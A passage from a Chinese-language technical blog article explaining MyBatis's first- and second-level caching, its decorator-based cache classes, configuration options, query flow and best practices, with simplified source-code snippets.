<p><strong>性能提升：</strong> 近1000倍！</p>
<h2 data-id="heading-2">MyBatis的两级防线</h2>
<p>MyBatis提供了两级缓存机制，就像双重保险：</p>























<table><thead><tr><th>缓存类型</th><th>作用范围</th><th>生命周期</th><th>是否默认开启</th></tr></thead><tbody><tr><td><strong>一级缓存</strong></td><td>SqlSession会话</td><td>与会话同生共死</td><td>默认开启</td></tr><tr><td><strong>二级缓存</strong></td><td>Mapper命名空间</td><td>应用级别，跨会话</td><td>需手动配置</td></tr></tbody></table>
<h2 data-id="heading-3">二、缓存架构</h2>
<p>MyBatis的缓存设计堪称教科书级别的装饰器模式应用。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/51ef1c22c22a4c72aa377fb27288455c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767947081&amp;x-signature=B0B5oC%2ByBwD0%2B62R6f%2BvUW0CXHE%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-4">Cache接口：缓存的灵魂</h2>
<p>所有缓存实现都遵循这个核心接口：</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title">Cache</span> {
    <span class="hljs-function">String <span class="hljs-title">getId</span>()</span>;                          <span class="hljs-comment">// 缓存标识</span>
    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">putObject</span>(<span class="hljs-params">Object key, Object <span class="hljs-keyword">value</span></span>)</span>; <span class="hljs-comment">// 存入缓存</span>
    <span class="hljs-function">Object <span class="hljs-title">getObject</span>(<span class="hljs-params">Object key</span>)</span>;             <span class="hljs-comment">// 获取缓存</span>
    <span class="hljs-function">Object <span class="hljs-title">removeObject</span>(<span class="hljs-params">Object key</span>)</span>;          <span class="hljs-comment">// 移除缓存</span>
    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">clear</span>()</span>;                            <span class="hljs-comment">// 清空缓存</span>
    <span class="hljs-function"><span class="hljs-built_in">int</span> <span class="hljs-title">getSize</span>()</span>;                           <span class="hljs-comment">// 缓存大小</span>
    <span class="hljs-function">ReadWriteLock <span class="hljs-title">getReadWriteLock</span>()</span>;        <span class="hljs-comment">// 读写锁</span>
}
</code></pre>
<h2 data-id="heading-5">装饰器大家族</h2>
<p>MyBatis通过装饰器模式为缓存"穿衣服"，每个装饰器赋予缓存一种新能力：</p>
<h2 data-id="heading-6">装饰器功能速查表</h2>




























































<table><thead><tr><th>装饰器</th><th>核心功能</th><th>适用场景</th></tr></thead><tbody><tr><td><strong>LruCache</strong></td><td>最近最少使用淘汰</td><td>热点数据缓存</td></tr><tr><td><strong>FifoCache</strong></td><td>先进先出淘汰</td><td>时序数据缓存</td></tr><tr><td><strong>SoftCache</strong></td><td>软引用，内存紧张时回收</td><td>大对象缓存</td></tr><tr><td><strong>WeakCache</strong></td><td>弱引用，GC时回收</td><td>内存敏感场景</td></tr><tr><td><strong>ScheduledCache</strong></td><td>定时清理</td><td>时效性数据</td></tr><tr><td><strong>SerializedCache</strong></td><td>序列化存储</td><td>数据隔离保护</td></tr><tr><td><strong>LoggingCache</strong></td><td>日志记录</td><td>性能监控</td></tr><tr><td><strong>SynchronizedCache</strong></td><td>线程同步</td><td>并发安全</td></tr><tr><td><strong>BlockingCache</strong></td><td>阻塞控制</td><td>防止击穿</td></tr><tr><td><strong>TransactionalCache</strong></td><td>事务缓存</td><td>事务一致性</td></tr></tbody></table>
<h2 data-id="heading-7">PerpetualCache：万丈高楼平地起</h2>
<p>这是最基础的缓存实现，简单而高效：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PerpetualCache</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Cache</span> {
    <span class="hljs-keyword">private</span> final <span class="hljs-title class_">String</span> id;
    <span class="hljs-keyword">private</span> final <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">Object</span>, <span class="hljs-title class_">Object</span>&gt; cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">putObject</span>(<span class="hljs-params"><span class="hljs-built_in">Object</span> key, <span class="hljs-built_in">Object</span> value</span>) {
        cache.<span class="hljs-title function_">put</span>(key, value);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Object</span> <span class="hljs-title function_">getObject</span>(<span class="hljs-params"><span class="hljs-built_in">Object</span> key</span>) {
        <span class="hljs-keyword">return</span> cache.<span class="hljs-title function_">get</span>(key);
    }

    <span class="hljs-comment">// ... 其他方法实现</span>
}
</code></pre>
<h2 data-id="heading-8">三、一级缓存：会话的专属记忆</h2>
<p>一级缓存是SqlSession级别的缓存，默认开启，无需配置。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/05d4504e1bf44a3791858be49e68c584~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767947081&amp;x-signature=PpFKNkzToWDkbgaNCoLGhhO7frI%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-9">工作原理解析</h2>
<p>一级缓存的核心逻辑在BaseExecutor中实现：</p>
<pre><code class="hljs language-scss" lang="scss">public &lt;E&gt; List&lt;E&gt; <span class="hljs-built_in">query</span>(MappedStatement ms, Object parameter, 
                         RowBounds rowBounds, ResultHandler resultHandler) {
    <span class="hljs-comment">//创建缓存键</span>
    CacheKey key = <span class="hljs-built_in">createCacheKey</span>(ms, parameter, rowBounds, boundSql);

    <span class="hljs-comment">//先查缓存</span>
    List&lt;E&gt; list = (List&lt;E&gt;) localCache<span class="hljs-selector-class">.getObject</span>(key);
    if (list != null) {
        return list; <span class="hljs-comment">// 缓存命中！</span>
    }

    <span class="hljs-comment">//缓存未命中，查询数据库</span>
    list = <span class="hljs-built_in">queryFromDatabase</span>(ms, parameter, rowBounds, 
                            resultHandler, key, boundSql);

    <span class="hljs-comment">//结果写入缓存</span>
    localCache<span class="hljs-selector-class">.putObject</span>(key, list);

    return list;
}
</code></pre>
<h2 data-id="heading-10">CacheKey：缓存的身份证</h2>
<p>CacheKey由多个元素组成，确保唯一性：</p>
<pre><code class="hljs language-sql" lang="sql">CacheKey的组成：
├── MappedStatement的ID
├── 查询参数
├── 分页信息（RowBounds）
├── <span class="hljs-keyword">SQL</span>语句
└── 环境ID
</code></pre>
<p><strong>判断缓存命中时，这些元素必须完全一致：</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-built_in">boolean</span> <span class="hljs-title function_">equals</span>(<span class="hljs-params"><span class="hljs-built_in">Object</span> <span class="hljs-built_in">object</span></span>) {
    final <span class="hljs-title class_">CacheKey</span> cacheKey = (<span class="hljs-title class_">CacheKey</span>) <span class="hljs-built_in">object</span>;

    <span class="hljs-keyword">return</span> hashcode == cacheKey.<span class="hljs-property">hashcode</span>      <span class="hljs-comment">// 哈希码相同</span>
        &amp;&amp; checksum == cacheKey.<span class="hljs-property">checksum</span>      <span class="hljs-comment">// 校验和相同</span>
        &amp;&amp; count == cacheKey.<span class="hljs-property">count</span>            <span class="hljs-comment">// 元素数量相同</span>
        &amp;&amp; updateList.<span class="hljs-title function_">equals</span>(cacheKey.<span class="hljs-property">updateList</span>); <span class="hljs-comment">// 元素列表相同</span>
}
</code></pre>
<h2 data-id="heading-11">五种失效场景</h2>
<p>一级缓存在以下情况会被清空：</p>
<ol>
<li>执行增删改操作</li>
<li>手动清空</li>
<li>提交事务</li>
<li>回滚事务</li>
<li>关闭会话</li>
</ol>

<pre><code class="hljs language-scss" lang="scss"><span class="hljs-keyword">@Override</span>
public int <span class="hljs-attribute">update</span>(MappedStatement ms, Object parameter) {
    <span class="hljs-built_in">clearLocalCache</span>(); <span class="hljs-comment">//清空缓存</span>
    return <span class="hljs-built_in">doUpdate</span>(ms, parameter);
}
</code></pre>

<pre><code class="hljs language-scss" lang="scss">session<span class="hljs-selector-class">.clearCache</span>(); <span class="hljs-comment">//主动清理</span>
</code></pre>

<pre><code class="hljs language-scss" lang="scss">session<span class="hljs-selector-class">.commit</span>(); <span class="hljs-comment">//提交时清空</span>
</code></pre>

<pre><code class="hljs language-scss" lang="scss">session<span class="hljs-selector-class">.rollback</span>(); <span class="hljs-comment">//回滚时清空</span>
</code></pre>

<pre><code class="hljs language-go" lang="go">session.<span class="hljs-built_in">close</span>(); <span class="hljs-comment">//会话结束，缓存消失</span>
</code></pre>
<h2 data-id="heading-12">实战演示</h2>
<pre><code class="hljs language-ini" lang="ini">SqlSession <span class="hljs-attr">session</span> = sqlSessionFactory.openSession()<span class="hljs-comment">;</span>
UserMapper <span class="hljs-attr">mapper</span> = session.getMapper(UserMapper.class)<span class="hljs-comment">;</span>

// 第一次查询 - 访问数据库
User <span class="hljs-attr">user1</span> = mapper.selectById(<span class="hljs-number">1</span>L)<span class="hljs-comment">;</span>
System.out.println("首次查询: " + user1)<span class="hljs-comment">;</span>

// 第二次查询 - 从缓存获取
User <span class="hljs-attr">user2</span> = mapper.selectById(<span class="hljs-number">1</span>L)<span class="hljs-comment">;</span>
System.out.println("再次查询: " + user2)<span class="hljs-comment">;</span>

// 验证是否为同一对象
System.out.println("同一对象? " + (<span class="hljs-attr">user1</span> == user2))<span class="hljs-comment">; //true</span>

session.close()<span class="hljs-comment">;</span>
</code></pre>
<h2 data-id="heading-13">四、二级缓存：跨会话的共享空间</h2>
<p>二级缓存是Mapper级别的缓存，可以在不同SqlSession之间共享数据。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/febc3e799e984f87a3826ee26ea18e9e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767947081&amp;x-signature=%2BMi1Ot2lFyp0u3f0bQ8IlqggoRw%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-14">开启二级缓存</h2>
<p>在Mapper XML中添加配置：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">"com.example.mapper.UserMapper"</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- 开启二级缓存 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">cache</span> <span class="hljs-attr">eviction</span>=<span class="hljs-string">"LRU"</span>
           <span class="hljs-attr">flushInterval</span>=<span class="hljs-string">"60000"</span>
           <span class="hljs-attr">size</span>=<span class="hljs-string">"1024"</span>
           <span class="hljs-attr">readOnly</span>=<span class="hljs-string">"true"</span>/&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"selectById"</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">"User"</span>&gt;</span>
        SELECT * FROM t_user WHERE id = #{id}
    <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">mapper</span>&gt;</span>
</code></pre>
<p>配置参数详解：</p>









































<table><thead><tr><th>参数</th><th>说明</th><th>可选值</th><th>默认值</th></tr></thead><tbody><tr><td><strong>eviction</strong></td><td>淘汰策略</td><td>LRU/FIFO/SOFT/WEAK</td><td>LRU</td></tr><tr><td><strong>flushInterval</strong></td><td>刷新间隔(毫秒)</td><td>任意正整数</td><td>不刷新</td></tr><tr><td><strong>size</strong></td><td>缓存容量</td><td>任意正整数</td><td>1024</td></tr><tr><td><strong>readOnly</strong></td><td>是否只读</td><td>true/false</td><td>false</td></tr><tr><td><strong>blocking</strong></td><td>是否阻塞</td><td>true/false</td><td>false</td></tr></tbody></table>
<h2 data-id="heading-15">四大淘汰策略</h2>
<ol>
<li>LRU（推荐）</li>
<li>FIFO</li>
<li>SOFT</li>
<li>WEAK</li>
</ol>

<pre><code class="hljs language-ini" lang="ini">&lt;cache <span class="hljs-attr">eviction</span>=<span class="hljs-string">"LRU"</span>/&gt;
</code></pre>
<p>最近最少使用，淘汰最久未访问的数据</p>
<pre><code class="hljs language-ini" lang="ini">&lt;cache <span class="hljs-attr">eviction</span>=<span class="hljs-string">"FIFO"</span>/&gt;
</code></pre>
<p>先进先出，按写入顺序淘汰</p>
<pre><code class="hljs language-ini" lang="ini">&lt;cache <span class="hljs-attr">eviction</span>=<span class="hljs-string">"SOFT"</span>/&gt;
</code></pre>
<p>软引用，内存不足时才回收</p>
<pre><code class="hljs language-ini" lang="ini">&lt;cache <span class="hljs-attr">eviction</span>=<span class="hljs-string">"WEAK"</span>/&gt;
</code></pre>
<p>弱引用，GC时即可回收</p>
<h2 data-id="heading-16">CachingExecutor：二级缓存的指挥官</h2>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CachingExecutor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Executor</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">TransactionalCacheManager</span> <span class="hljs-variable">tcm</span> <span class="hljs-operator">=</span> 
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransactionalCacheManager</span>();

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> &lt;E&gt; List&lt;E&gt; <span class="hljs-title function_">query</span><span class="hljs-params">(...)</span> {
        <span class="hljs-type">Cache</span> <span class="hljs-variable">cache</span> <span class="hljs-operator">=</span> ms.getCache();

        <span class="hljs-keyword">if</span> (cache != <span class="hljs-literal">null</span>) {
            <span class="hljs-comment">//尝试从二级缓存获取</span>
            List&lt;E&gt; list = (List&lt;E&gt;) tcm.getObject(cache, key);
            <span class="hljs-keyword">if</span> (list != <span class="hljs-literal">null</span>) {
                <span class="hljs-keyword">return</span> list; <span class="hljs-comment">//命中！</span>
            }
        }

        <span class="hljs-comment">//委托给BaseExecutor查询（会走一级缓存）</span>
        List&lt;E&gt; list = delegate.query(...);

        <span class="hljs-comment">//结果写入二级缓存</span>
        <span class="hljs-keyword">if</span> (cache != <span class="hljs-literal">null</span>) {
            tcm.putObject(cache, key, list);
        }

        <span class="hljs-keyword">return</span> list;
    }
}
</code></pre>
<h2 data-id="heading-17">TransactionalCache：事务缓存管家</h2>
<p>事务缓存确保只有提交后的数据才会进入二级缓存：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransactionalCache</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Cache</span> {
    <span class="hljs-keyword">private</span> final <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">Object</span>, <span class="hljs-title class_">Object</span>&gt; entriesToAddOnCommit;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">putObject</span>(<span class="hljs-params"><span class="hljs-built_in">Object</span> key, <span class="hljs-built_in">Object</span> value</span>) {
        <span class="hljs-comment">//暂存，不立即写入</span>
        entriesToAddOnCommit.<span class="hljs-title function_">put</span>(key, value);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">commit</span>(<span class="hljs-params"/>) {
        <span class="hljs-comment">// 提交时才真正写入缓存</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-title class_">Map</span>.<span class="hljs-property">Entry</span>&lt;<span class="hljs-title class_">Object</span>, <span class="hljs-title class_">Object</span>&gt; entry : 
             entriesToAddOnCommit.<span class="hljs-title function_">entrySet</span>()) {
            delegate.<span class="hljs-title function_">putObject</span>(entry.<span class="hljs-title function_">getKey</span>(), entry.<span class="hljs-title function_">getValue</span>());
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">rollback</span>(<span class="hljs-params"/>) {
        <span class="hljs-comment">// 回滚时丢弃暂存数据</span>
        entriesToAddOnCommit.<span class="hljs-title function_">clear</span>();
    }
}
</code></pre>
<h2 data-id="heading-18">跨会话共享示例</h2>
<pre><code class="hljs language-ini" lang="ini">//会话1
SqlSession <span class="hljs-attr">session1</span> = sqlSessionFactory.openSession()<span class="hljs-comment">;</span>
UserMapper <span class="hljs-attr">mapper1</span> = session1.getMapper(UserMapper.class)<span class="hljs-comment">;</span>
User <span class="hljs-attr">user1</span> = mapper1.selectById(<span class="hljs-number">1</span>L)<span class="hljs-comment">;</span>
System.out.println("会话1查询: " + user1)<span class="hljs-comment">;</span>
session1.commit()<span class="hljs-comment">; //提交，写入二级缓存</span>
session1.close()<span class="hljs-comment">;</span>
//会话2
SqlSession <span class="hljs-attr">session2</span> = sqlSessionFactory.openSession()<span class="hljs-comment">;</span>
UserMapper <span class="hljs-attr">mapper2</span> = session2.getMapper(UserMapper.class)<span class="hljs-comment">;</span>
User <span class="hljs-attr">user2</span> = mapper2.selectById(<span class="hljs-number">1</span>L)<span class="hljs-comment">; //从二级缓存获取</span>
System.out.println("会话2查询: " + user2)<span class="hljs-comment">;</span>
//对比结果
System.out.println("同一对象? " + (<span class="hljs-attr">user1</span> == user2))<span class="hljs-comment">; //false</span>
System.out.println("值相等? " + user1.equals(user2))<span class="hljs-comment">; //true</span>
session2.close()<span class="hljs-comment">;</span>
</code></pre>
<h2 data-id="heading-19">五、缓存命中流程</h2>
<p>全景理解缓存的完整查询流程，是优化性能的关键。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/774912ed56e640a78218d99c4354807c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767947081&amp;x-signature=7G3XYVlAQSSz7WVoRc2RuCM64NQ%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-20">完整查询链路</h2>
<pre><code class="hljs language-markdown" lang="markdown">查询请求
<span class="hljs-code">    ↓
检查二级缓存
    ├─ 命中 → 直接返回
    └─ 未命中
         ↓
    检查一级缓存
         ├─ 命中 → 直接返回
         └─ 未命中
              ↓
         查询数据库
              ↓
         写入一级缓存
              ↓
         写入二级缓存（提交后）
              ↓
         返回结果
</span></code></pre>
<h2 data-id="heading-21">源码实现</h2>
<pre><code class="hljs language-scss" lang="scss">public &lt;E&gt; List&lt;E&gt; <span class="hljs-built_in">query</span>(MappedStatement ms, Object parameter, ...) {
    BoundSql boundSql = ms<span class="hljs-selector-class">.getBoundSql</span>(parameter);
    CacheKey key = <span class="hljs-built_in">createCacheKey</span>(ms, parameter, rowBounds, boundSql);

    <span class="hljs-comment">// 步骤1：查二级缓存</span>
    Cache cache = ms<span class="hljs-selector-class">.getCache</span>();
    if (cache != null &amp;&amp; ms.isUseCache()) {
        List&lt;E&gt; list = (List&lt;E&gt;) tcm<span class="hljs-selector-class">.getObject</span>(cache, key);
        if (list != null) {
            return list; <span class="hljs-comment">// 二级缓存命中</span>
        }
    }

    <span class="hljs-comment">// 步骤2：查一级缓存</span>
    List&lt;E&gt; list = (List&lt;E&gt;) localCache<span class="hljs-selector-class">.getObject</span>(key);
    if (list != null) {
        return list; <span class="hljs-comment">// 一级缓存命中</span>
    }

    <span class="hljs-comment">//步骤3：查数据库</span>
    list = <span class="hljs-built_in">queryFromDatabase</span>(ms, parameter, ...);

    <span class="hljs-comment">//步骤4：写入缓存</span>
    localCache<span class="hljs-selector-class">.putObject</span>(key, list);
    if (cache != null) {
        tcm<span class="hljs-selector-class">.putObject</span>(cache, key, list);
    }

    return list;
}
</code></pre>
<h2 data-id="heading-22">六、装饰器模式的运用</h2>
<p>MyBatis缓存的装饰器设计堪称经典，让我们看看如何"给缓存穿衣服"。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e4444a998bbf45dbb1e37b8596b50b1f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767947081&amp;x-signature=Gx%2BfsEnxv%2FuSGg3OQD7B4npkcB4%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-23">LruCache：智能淘汰</h2>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LruCache</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Cache</span> {
    <span class="hljs-keyword">private</span> final <span class="hljs-title class_">Cache</span> delegate;
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">Object</span>, <span class="hljs-title class_">Object</span>&gt; keyMap; <span class="hljs-comment">// LinkedHashMap实现LRU</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Object</span> eldestKey;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Object</span> <span class="hljs-title function_">getObject</span>(<span class="hljs-params"><span class="hljs-built_in">Object</span> key</span>) {
        keyMap.<span class="hljs-title function_">get</span>(key); <span class="hljs-comment">//访问即刷新顺序</span>
        <span class="hljs-keyword">return</span> delegate.<span class="hljs-title function_">getObject</span>(key);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">putObject</span>(<span class="hljs-params"><span class="hljs-built_in">Object</span> key, <span class="hljs-built_in">Object</span> value</span>) {
        delegate.<span class="hljs-title function_">putObject</span>(key, value);
        <span class="hljs-title function_">cycleKeyList</span>(key); <span class="hljs-comment">//淘汰最久未用的</span>
    }
}
</code></pre>
<h2 data-id="heading-24">ScheduledCache：定时清理</h2>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ScheduledCache</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Cache</span> {
    <span class="hljs-keyword">private</span> long <span class="hljs-built_in">clearInterval</span> = <span class="hljs-number">3600000</span>; <span class="hljs-comment">// 1小时</span>
    <span class="hljs-keyword">private</span> long lastClear;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Object</span> <span class="hljs-title function_">getObject</span>(<span class="hljs-params"><span class="hljs-built_in">Object</span> key</span>) {
        <span class="hljs-keyword">if</span> (<span class="hljs-title class_">System</span>.<span class="hljs-title function_">currentTimeMillis</span>() - lastClear &gt; <span class="hljs-built_in">clearInterval</span>) {
            <span class="hljs-title function_">clear</span>(); <span class="hljs-comment">//时间到，清空缓存</span>
            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
        }
        <span class="hljs-keyword">return</span> delegate.<span class="hljs-title function_">getObject</span>(key);
    }
}
</code></pre>
<h2 data-id="heading-25">SerializedCache：深拷贝保护</h2>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializedCache</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Cache</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">putObject</span>(<span class="hljs-params"><span class="hljs-built_in">Object</span> key, <span class="hljs-built_in">Object</span> value</span>) {
        <span class="hljs-comment">// 序列化存储</span>
        delegate.<span class="hljs-title function_">putObject</span>(key, <span class="hljs-title function_">serialize</span>((<span class="hljs-title class_">Serializable</span>) value));
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Object</span> <span class="hljs-title function_">getObject</span>(<span class="hljs-params"><span class="hljs-built_in">Object</span> key</span>) {
        <span class="hljs-comment">// 反序列化返回，每次都是新对象</span>
        <span class="hljs-title class_">Object</span> <span class="hljs-built_in">object</span> = delegate.<span class="hljs-title function_">getObject</span>(key);
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">object</span> == <span class="hljs-literal">null</span> ? <span class="hljs-literal">null</span> : <span class="hljs-title function_">deserialize</span>((byte[]) <span class="hljs-built_in">object</span>);
    }
}
</code></pre>
<h2 data-id="heading-26">SynchronizedCache：线程安全卫士</h2>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SynchronizedCache</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Cache</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> synchronized <span class="hljs-built_in">void</span> <span class="hljs-title function_">putObject</span>(<span class="hljs-params"><span class="hljs-built_in">Object</span> key, <span class="hljs-built_in">Object</span> value</span>) {
        delegate.<span class="hljs-title function_">putObject</span>(key, value);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> synchronized <span class="hljs-title class_">Object</span> <span class="hljs-title function_">getObject</span>(<span class="hljs-params"><span class="hljs-built_in">Object</span> key</span>) {
        <span class="hljs-keyword">return</span> delegate.<span class="hljs-title function_">getObject</span>(key);
    }
}
</code></pre>
<h2 data-id="heading-27">装饰器链的构建</h2>
<pre><code class="hljs language-scss" lang="scss">private Cache <span class="hljs-built_in">setStandardDecorators</span>(Cache cache) {
    <span class="hljs-comment">//按顺序穿衣服</span>
    if (blocking) {
        cache = new <span class="hljs-built_in">BlockingCache</span>(cache);
    }
    if (readWrite) {
        cache = new <span class="hljs-built_in">SerializedCache</span>(cache);
    }
    if (scheduled) {
        cache = new <span class="hljs-built_in">ScheduledCache</span>(cache);
    }
    if (logging) {
        cache = new <span class="hljs-built_in">LoggingCache</span>(cache);
    }
    if (sync) {
        cache = new <span class="hljs-built_in">SynchronizedCache</span>(cache);
    }
    <span class="hljs-comment">//LRU通常是最外层</span>
    cache = new <span class="hljs-built_in">LruCache</span>(cache);

    return cache;
}
</code></pre>
<h2 data-id="heading-28">七、最佳实践</h2>
<h2 data-id="heading-29">推荐做法</h2>
<pre><code class="hljs language-ini" lang="ini">1.一级缓存- 保持默认开启，适合单会话重复查询
2.二级缓存- 仅在读多写少的场景开启
3.LRU策略- 大多数场景的最佳选择
4.合理设置容量- 根据业务量评估，避免内存溢出
5.只读缓存- 不可变对象使用 
<span class="hljs-attr">readOnly</span>=<span class="hljs-string">"true"</span>
</code></pre>
<h2 data-id="heading-30">避免做法</h2>
<pre><code class="hljs">1.在频繁更新的表上开启二级缓存
2.缓存大对象或包含敏感信息的对象
3.忽略缓存带来的数据一致性问题
4.不监控缓存命中率就盲目使用
</code></pre>
<h2 data-id="heading-31">性能优化技巧</h2>
<ol>
<li>热点数据优先</li>
<li>合理设置TTL</li>
<li>只读缓存加速</li>
<li>监控命中率</li>
</ol>

<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- 核心业务表单独配置 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">cache</span> <span class="hljs-attr">size</span>=<span class="hljs-string">"2048"</span> <span class="hljs-attr">eviction</span>=<span class="hljs-string">"LRU"</span>/&gt;</span>
</code></pre>

<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- 根据数据更新频率设置 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">cache</span> <span class="hljs-attr">flushInterval</span>=<span class="hljs-string">"300000"</span>/&gt;</span> <span class="hljs-comment">&lt;!-- 5分钟 --&gt;</span>
</code></pre>

<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- 不可变数据使用只读缓存 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">cache</span> <span class="hljs-attr">readOnly</span>=<span class="hljs-string">"true"</span>/&gt;</span>
</code></pre>

<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- 开启日志记录 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">cache</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"logging"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"true"</span>/&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">cache</span>&gt;</span>
</code></pre>
<h2 data-id="heading-32">常见问题速查</h2>
<p>问题1：二级缓存不生效</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- 解决方案 --&gt;</span>
<span class="hljs-comment">&lt;!-- 1. 检查全局配置 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">settings</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">setting</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"cacheEnabled"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"true"</span>/&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">settings</span>&gt;</span>

<span class="hljs-comment">&lt;!-- 2. 检查Mapper配置 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">cache</span>/&gt;</span>

